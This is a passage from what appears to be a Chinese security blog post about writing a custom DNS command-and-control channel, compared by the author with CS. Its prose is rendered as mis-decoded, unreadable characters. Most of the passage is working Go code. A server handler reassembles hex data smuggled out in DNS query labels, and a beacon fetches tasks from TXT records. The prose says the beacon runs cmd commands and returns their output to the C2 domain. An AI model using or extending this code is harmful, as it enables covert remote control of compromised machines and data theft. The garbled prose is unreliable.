class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleA</span><span class="params">(name <span class="type">string</span>)</span></span> net.IP &#123;  </span><br><span class="line">    <span class="keyword">var</span> ip net.IP  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;[handleA] %s\n&quot;</span>, name)  </span><br><span class="line">    parts := strings.Split(strings.TrimSuffix(name, <span class="string">&quot;.&quot;</span>), <span class="string">&quot;.&quot;</span>)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span> parts[<span class="number">0</span>] &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;www&quot;</span>, <span class="string">&quot;post&quot;</span>:  </span><br><span class="line">       ip = CallbackDataHandler(parts)  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;api&quot;</span>:  </span><br><span class="line">       ip = net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       ip = net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">2</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> ip  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// å…¨å±€åªè¯» mapï¼Œå†™æ“ä½œä»…å‘ç”Ÿåœ¨é¦–æ¬¡æ”¶ length æ—¶ï¼Œä¹‹ååªè¯»  </span></span><br><span class="line"><span class="keyword">var</span> wwwNoLock = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*wwwSession)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> wwwSession <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Length <span class="type">int</span>  </span><br><span class="line">    Data   <span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">byte</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨ <code>CallbackDataHandler</code> æŠŠå®¢æˆ·ç«¯é€šè¿‡DNSæŸ¥è¯¢åå·å·å¸¦è¿›æ¥çš„äºŒè¿›åˆ¶ç‰‡æ®µé‡æ–°æ‹¼æˆå®Œæ•´æ–‡ä»¶ã€‚</p>
<p>é¦–å…ˆå†æ¥çœ‹é•¿åº¦å’Œæ•°æ®åŸŸåçš„æ ¼å¼ï¼Œæ–¹ä¾¿ç†è§£æˆ‘åç»­çš„æè¿°ï¼š </p>
<ul>
<li>é•¿åº¦ï¼š<code>www.&lt;lablecount&gt;.&lt;é•¿åº¦&gt;.&lt;reqno+nonce&gt;.&lt;agentid&gt;.&lt;domain&gt;</code></li>
<li>æ•°æ®ï¼š<code>www.&lt;lablecount&gt;.&lt;hex-seg-1&gt;.&lt;hex-seg-2&gt;...&lt;hex-seg-N&gt;.&lt;reqno+nonce&gt;.&lt;agentid&gt;.&lt;domain&gt;</code></li>
</ul>
<p>æ ¹æ®Beaconä¸ServeråŒæ–¹å¯¹äºåŸŸåçš„çº¦å®šï¼Œæå–<strong>reqno</strong>ä¸<strong>nonce</strong>ã€‚reqno &#x3D;&#x3D; 0 â†’ <strong>é¦–åŒ…</strong>ï¼Œé‡Œé¢æ”¾çš„æ˜¯â€œæ€»é•¿åº¦â€ã€‚reqno &gt; 0 â†’ <strong>æ•°æ®åŒ…</strong>ï¼Œé‡Œé¢æ”¾çš„æ˜¯â€œåºå·+æ•°æ®â€ï¼Œreqnoä»1å¼€å§‹å°±ä»å½“wwwSession.Dataçš„é”®ï¼Œå•ä¸ªåŸŸåè§£æå¾—åˆ°çš„æ•°æ®å­˜æ”¾åœ¨ä»¥reqnoä¸ºé”®çš„mapé‡Œï¼Œè¿™æ˜¯ä¸ºäº†æ–¹ä¾¿åç»­è¿˜åŸåŸå§‹æ•°æ®ã€‚</p>
<p>æ¥ç€è·å– <code>lablecount</code>ï¼Œå®ƒçš„ç”¨å¤„è¡¨æ˜ <code>lablecount</code> å­—æ®µåé¢çš„æ•°æ®ç”¨äº†å¤šå°‘ä¸ªæ ‡ç­¾ï¼Œç„¶åå°†åˆ†æ•£çš„hexæ ¼å¼çš„æ•°æ®æ‹¼æ¥èµ·æ¥è¿˜åŸæˆå­—èŠ‚æ•°æ®ã€‚</p>
<p>æœ€åæ˜¯æ”¶é½æ‹¼è£…ï¼Œå½“å·²æ”¶å­—èŠ‚æ•° â‰¥ é¦–åŒ…å£°æ˜çš„æ€»é•¿åº¦ï¼Œå³ <code>got &gt;= s.Length</code> æ—¶ï¼ŒæœåŠ¡ç«¯æŠŠ<strong>ç›¸åŒ nonce</strong> çš„ç‰‡æ®µæŒ‰ <strong>reqno å‡åº</strong>æ‹¼åœ¨ä¸€èµ·å¹¶ç”¨è¿”å›IP <code>192.168.1.253</code> å‘Šè¯‰å®¢æˆ·ç«¯â€œæ”¶å·¥â€ï¼Œå…¶å®è¿™ä¸ªæ§åˆ¶ä¿¡å·ä¹Ÿæ²¡ç”¨åˆ°&#x3D;ã€‚&#x3D;ã€‚</p>
<p>âš æ³¨æ„ï¼šæˆ‘å¹¶æœªä½¿ç”¨åˆ° <code>agentid</code> å­—æ®µï¼Œå¦‚æœæ¶‰åŠå¤šBeaconä¸Šçº¿ï¼Œä¸ºäº†åŒºåˆ†ä¸åŒï¼Œä¸åŒBeaconå‘é€çš„æ•°æ®ï¼Œä¸€å®šè¦ç”¨åˆ° <code>agentid</code> å­—æ®µï¼Œå…·ä½“æ€ä¹ˆæ”¹åˆæ˜¯å€¼å¾—æ€è€ƒçš„é—®é¢˜â€¦â€¦</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å…¨å±€åªè¯» mapï¼Œå†™æ“ä½œä»…å‘ç”Ÿåœ¨é¦–æ¬¡æ”¶ length æ—¶ï¼Œä¹‹ååªè¯»  </span></span><br><span class="line"><span class="keyword">var</span> wwwNoLock = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*wwwSession)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> wwwSession <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Length <span class="type">int</span>  </span><br><span class="line">    Data   <span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">byte</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/* ---------- æ— é”æ‹¼è£… ---------- */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CallbackDataHandler</span><span class="params">(parts []<span class="type">string</span>)</span></span> net.IP &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       reqno <span class="type">int64</span>  </span><br><span class="line">       err   <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">	<span class="comment">// æ¯”å¦‚www.1.len.0nonce.agentid.domain é•¿åº¦åŒ…  </span></span><br><span class="line">	<span class="comment">// æ¯”å¦‚www.1.data.0nonce.agentid.domain æ•°æ®åŒ…  </span></span><br><span class="line">    n := <span class="built_in">len</span>(parts)  </span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">6</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è·å–nonceField  </span></span><br><span class="line">    nonceField := parts[n<span class="number">-5</span>]  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nonceField) &lt; <span class="number">9</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è·å–reqno  </span></span><br><span class="line">    reqstr := nonceField[:<span class="number">2</span>]  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> reqstr[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; <span class="built_in">len</span>(reqstr) &gt; <span class="number">1</span> &#123;  </span><br><span class="line">       reqno, err = strconv.ParseInt(reqstr[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>, <span class="number">32</span>)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       reqno, err = strconv.ParseInt(reqstr, <span class="number">16</span>, <span class="number">32</span>)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    nonce := nonceField[<span class="number">2</span>:<span class="number">10</span>]  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// é¦–æ¬¡åŒ…ï¼šåˆ›å»ºä¼šè¯ï¼Œä¸€æ¬¡æ€§å†™å…¥mapï¼Œä¹‹ååªè¯»  </span></span><br><span class="line">    <span class="keyword">if</span> reqno == <span class="number">0</span> &#123;  </span><br><span class="line">       length, err := strconv.ParseInt(parts[<span class="number">2</span>], <span class="number">16</span>, <span class="number">32</span>)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="comment">// å”¯ä¸€ä¸€æ¬¡å†™æ“ä½œï¼Œå‘ç”Ÿåœ¨æµæœ€å¼€å§‹ï¼Œå¹¶å‘å†²çªæ¦‚ç‡æä½  </span></span><br><span class="line">       wwwNoLock[nonce] = &amp;wwwSession&#123;  </span><br><span class="line">          Length: <span class="type">int</span>(length),  </span><br><span class="line">          Data:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">byte</span>),  </span><br><span class="line">       &#125;  </span><br><span class="line">       log.Printf(<span class="string">&quot;[CallbackDataHandler] new session nonce=%s len=%d\n&quot;</span>, nonce, length)  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       <span class="comment">// æ•°æ®ç‰‡ï¼šæ— é”è¯»  </span></span><br><span class="line">       s, ok := wwwNoLock[nonce]  </span><br><span class="line">       <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       lablecount, err := strconv.Atoi(parts[<span class="number">1</span>])  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// æ‹¼ hex       </span></span><br><span class="line">       hexStr := strings.Join(parts[<span class="number">2</span>:<span class="number">2</span>+lablecount], <span class="string">&quot;&quot;</span>)  </span><br><span class="line">       raw, err := hex.DecodeString(hexStr)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">1</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">       s.Data[<span class="type">int</span>(reqno)] = raw  </span><br><span class="line">       <span class="built_in">println</span>(reqno)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// æ”¶é½æ£€æŸ¥  </span></span><br><span class="line">       got := <span class="number">0</span>  </span><br><span class="line">       <span class="keyword">for</span> _, v := <span class="keyword">range</span> s.Data &#123;  </span><br><span class="line">          got += <span class="built_in">len</span>(v)  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="built_in">println</span>(got)  </span><br><span class="line">       <span class="keyword">if</span> got &gt;= s.Length &#123;  </span><br><span class="line">          keys := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="built_in">len</span>(s.Data))  </span><br><span class="line">          <span class="keyword">for</span> k := <span class="keyword">range</span> s.Data &#123;  </span><br><span class="line">             keys = <span class="built_in">append</span>(keys, k)  </span><br><span class="line">          &#125;  </span><br><span class="line">          sort.Ints(keys)  </span><br><span class="line">  </span><br><span class="line">          full := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">0</span>, s.Length)  </span><br><span class="line">          <span class="keyword">for</span> _, k := <span class="keyword">range</span> keys &#123;  </span><br><span class="line">             full = <span class="built_in">append</span>(full, s.Data[k]...)  </span><br><span class="line">          &#125;  </span><br><span class="line">          full = full[:s.Length] <span class="comment">// ç²¾ç¡®æˆªæ–­  </span></span><br><span class="line">  </span><br><span class="line">          log.Printf(<span class="string">&quot;[CallbackDataHandler] session %s finished (%d bytes):\n%s\n&quot;</span>, nonce, s.Length, <span class="type">string</span>(full))  </span><br><span class="line">          <span class="built_in">delete</span>(wwwNoLock, nonce)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">return</span> net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">1</span>, <span class="number">253</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>processResponse</code>æŠŠæ¶ˆæ¯å†™å›å®¢æˆ·ç«¯</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processResponse</span><span class="params">(w dns.ResponseWriter, msg *dns.Msg)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">defer</span> w.Close()  </span><br><span class="line">    <span class="keyword">if</span> err := w.WriteMsg(msg); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Println(<span class="string">&quot;[processResponse] write error:&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šåœ¨åˆ°è¿™é‡ŒServerçš„ä»£ç å°±ç¼–å†™å®Œæˆäº†ï¼Œä»£ç è‚¯å®šè¿˜æœ‰è¡¥å……å’Œä¼˜åŒ–çš„åœ°æ–¹ï¼Œåªæ˜¯æ—¶é—´æœ‰é™æˆ‘å°±ä¸æ”¹äº†ã€‚</p>
<h3 id="ï¼ˆä¸‰ï¼‰è·å–ä»»åŠ¡ã€æ‰§è¡Œä»»åŠ¡ã€å›ä¼ ç»“æœ-Beacon"><a href="#ï¼ˆä¸‰ï¼‰è·å–ä»»åŠ¡ã€æ‰§è¡Œä»»åŠ¡ã€å›ä¼ ç»“æœ-Beacon" class="headerlink" title="ï¼ˆä¸‰ï¼‰è·å–ä»»åŠ¡ã€æ‰§è¡Œä»»åŠ¡ã€å›ä¼ ç»“æœ-Beacon"></a>ï¼ˆä¸‰ï¼‰è·å–ä»»åŠ¡ã€æ‰§è¡Œä»»åŠ¡ã€å›ä¼ ç»“æœ-Beacon</h3><p>å…ˆçœ‹ä¸»å¾ªç¯é‡Œçš„å†…å®¹ï¼ˆè§ä¸‹å›¾ï¼‰ï¼Œä»£ç éå¸¸ç®€å•ï¼šç”¨ <code>DNSGet_TXT</code> è·å–æ§åˆ¶ä¿¡å·å’Œä»»åŠ¡æ•°æ®ï¼Œæ ¹æ®æ§åˆ¶ä¿¡å·èµ°åˆ°ä¸åŒçš„å¤„ç†åˆ†æ”¯ï¼ˆæœ¬æ–‡å°±ä¸€ä¸ªåˆ†æ”¯ï¼‰ï¼Œæœ€åå°†ä»»åŠ¡æ•°æ®ä»¥postä½œä¸ºå‰ç¼€çš„åŸŸåè°ƒç”¨ <code>DNSPut</code> å°†ç»“æœå›ä¼ ç»™æœåŠ¡å™¨ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/20-57-22-0b20f3eeefa0b6152db1565e499fbfae-20250922205721-423418.png"></p>
<p>ä»£ç ä¸­æ‰§è¡Œcmdå‘½ä»¤è·å–æ‰§è¡Œç»“æœä½œä¸ºå›ä¼ æ•°æ®ï¼Œå…¶å®ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½è®²çš„ï¼Œç„¶å<code>DNSPut</code> ä¸Šæ–‡å·²ç»ä»‹ç»è¿‡äº†ï¼Œä¸‹é¢é‡ç‚¹ä»‹ç» <code>DNSGet_TXT</code></p>
<p><strong>ç¬¬ä¸€</strong>ï¼šé€šè¿‡ä»¥apiä½œä¸ºå‰ç¼€ï¼Œæ ¼å¼åŒ–æŸ¥è¯¢åŸŸåçš„æ¯ä¸€ä¸ªæ ‡ç­¾è·å¾— <code>c2domain</code>ï¼Œè°ƒç”¨ <code>channelLookupRetry_A</code> è·å–æ§åˆ¶ä¿¡å·ã€‚æˆ‘è¿™è¾¹çš„æ§åˆ¶ä¿¡å·ä¸CSæ˜¯ä¸åŒçš„ï¼Œæˆ‘æ˜¯æƒ³å°†ä¿¡å·å€¼ <code>1~255</code> éƒ½ç”¨ä¸Šï¼Œåœ¨å®é™…è®¾è®¡çš„æ—¶å€™æ²¡æœ‰è€ƒè™‘åˆ°å¤šä»»åŠ¡åŒæ—¶ä¸‹å‘ç»™beaconï¼Œå¯¼è‡´beaconæ¯æ¬¡åªèƒ½è·å–ä¸€ä¸ªä»»åŠ¡ã€‚</p>
<p><strong>ç¬¬äºŒ</strong>ï¼šå‘<strong>TXTæŸ¥è¯¢</strong>æ‹¿çœŸæ­£çš„ä»»åŠ¡æ•°æ®ï¼ŒæŠŠåº”ç­”é‡Œæ‰€æœ‰TXTæ®µçš„å­—ç¬¦ä¸²é¡ºåºæ‹¼æ¥ï¼Œå•txtæ®µ â‰¤ 255Bï¼Œä¸€ä¸ª <code>TXT</code> å“åº”æŠ¥æ–‡å¯ä»¥æ”¾ç½®å¤šä¸ªtxtæ®µï¼Œç”±äºæœ¬æ–‡è®¾ç½®4096Bçš„æœ€å¤§UDPSizeï¼Œæ‰€ä»¥<strong>ä¸€æ¡TXTå“åº”æŠ¥æ–‡</strong>åªèƒ½æºå¸¦æœ€å¤š4KBçš„æ•°æ®ï¼Œå¤§æ–‡ä»¶ä¼ è¾“è¿˜éœ€è¦å®ç°åˆ†ç‰‡ä¸ç»„è£…ï¼ˆçœŸçš„å¾ˆçƒ¦ï¼‰ã€‚</p>
<p>å…¶å®é™¤äº†åˆ†ç‰‡è¿˜æœ‰ä¸€ä¸ªå°šæœªè§£å†³çš„é—®é¢˜ï¼ˆä»£ç ä¸­æœªå®ç°ï¼‰ï¼šå½“Beaconæƒ³ä¸€æ¬¡è·å–å¤šä¸ªä»»åŠ¡ï¼Œè¿˜ç”¨æ§åˆ¶ä¿¡å·æ¥åŒºåˆ†ä¸åŒå‘½ä»¤æ˜¯ä¸åˆç†çš„ï¼Œå› ä¸ºä¸€ä¸ªaè®°å½•æŸ¥è¯¢ä¹‹åè¦ç´§æ¥ç€txtè®°å½•æŸ¥è¯¢ï¼Œä¸ç„¶æ§åˆ¶ä¿¡å·ä¸ä»»åŠ¡æ•°æ®ä¸å¯¹åº”ã€‚æˆ‘èƒ½æƒ³åˆ°çš„è§£å†³æ–¹æ¡ˆæ˜¯ä¸ä½¿ç”¨æ§åˆ¶ä¿¡å·ï¼ˆä¸å‘aè®°å½•æŸ¥è¯¢ï¼‰ï¼Œè€Œæ˜¯å°†å‘½ä»¤ç±»å‹ï¼ˆcommandidï¼‰ä¸ä»»åŠ¡æ•°æ®åŒæ—¶æ”¾åœ¨åœ¨txtåŒ…é‡Œã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹serverå’Œbeaconä¼ è¾“çš„æ•°æ®éƒ½æ˜¯æœªåŠ å¯†çš„ï¼Œå¦‚æœæƒ³åŠ å¯†æ•°æ®çš„å¸ˆå‚…å¯ä»¥è‡ªè¡Œå®ç°ã€‚</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DNSGet_TXT</span><span class="params">(typeStr, domain, server <span class="type">string</span>)</span></span> (<span class="type">uint8</span>, []<span class="type">byte</span>) &#123;  </span><br><span class="line">    reqno := <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       c2domain <span class="type">string</span>  </span><br><span class="line">       signal   <span class="type">uint8</span>  </span><br><span class="line">    )  </span><br><span class="line">    <span class="comment">// ç”Ÿæˆéšæœºnonce  </span></span><br><span class="line">    nonce := rand.Uint32() | (rand.Uint32() &lt;&lt; <span class="number">16</span>)  </span><br><span class="line">    c2domain = fmt.Sprintf(<span class="string">&quot;%s.%x%x.%s&quot;</span>, typeStr, reqno, nonce, domain)  </span><br><span class="line">    signal = channelLookupRetry_A(c2domain, server, <span class="number">100</span>)  </span><br><span class="line">  </span><br><span class="line">    m := <span class="built_in">new</span>(dns.Msg)  </span><br><span class="line">    m.SetQuestion(dns.Fqdn(c2domain), dns.TypeTXT)  </span><br><span class="line">    m.RecursionDesired = <span class="literal">true</span>  </span><br><span class="line">  </span><br><span class="line">    co, err := net.Dial(<span class="string">&quot;udp&quot;</span>, server)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_DONOTHING, <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> co.Close()  </span><br><span class="line">    co.SetDeadline(time.Now().Add(<span class="number">5</span> * time.Second))  </span><br><span class="line">  </span><br><span class="line">    dnsConn := &amp;dns.Conn&#123;Conn: co, UDPSize: <span class="number">4096</span>&#125;  </span><br><span class="line">    <span class="keyword">if</span> err := dnsConn.WriteMsg(m); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_DONOTHING, <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    r, err := dnsConn.ReadMsg()  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_DONOTHING, <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">var</span> sb strings.Builder  </span><br><span class="line">    <span class="keyword">for</span> _, ans := <span class="keyword">range</span> r.Answer &#123;  </span><br><span class="line">       <span class="keyword">if</span> t, ok := ans.(*dns.TXT); ok &#123;  </span><br><span class="line">          <span class="keyword">for</span> _, s := <span class="keyword">range</span> t.Txt &#123;  </span><br><span class="line">             sb.WriteString(s)  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> signal, []<span class="type">byte</span>(sb.String())  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘æ”¶å›å¼€å¤´çš„é‚£å¥è¯ï¼Œæˆ‘çš„dns c2å†™çš„çœŸæ˜¯ä¸€å¨ï¼Œé£Ÿä¹‹æ— å‘³å¼ƒä¹‹å¯æƒœã€‚</p>
<h3 id="ï¼ˆå››ï¼‰å®éªŒ"><a href="#ï¼ˆå››ï¼‰å®éªŒ" class="headerlink" title="ï¼ˆå››ï¼‰å®éªŒ"></a>ï¼ˆå››ï¼‰å®éªŒ</h3><p>æ‰§è¡Œä»£ç ï¼Œåªçœ‹Serverçš„æ§åˆ¶å°è¾“å‡º</p>
<p>æ¥æ”¶metadataã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/21-28-25-047235c9ae17aea8aee33987767ede21-20250922212825-92da9f.png"></p>
<p>æ¥æ”¶å›ä¼ ç»“æœã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/21-32-31-658b72083b072edaa17a43b13ebc296b-20250922213230-5cb3ac.png"></p>
<p>beaconåœ¨win10å¥½åƒä¸è¡Œï¼Ÿä¸æ‡‚å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œç´¯äº†ï¼Œç­‰å“ªå¤©æœ‰ç©ºå†è¯´ã€‚</p>
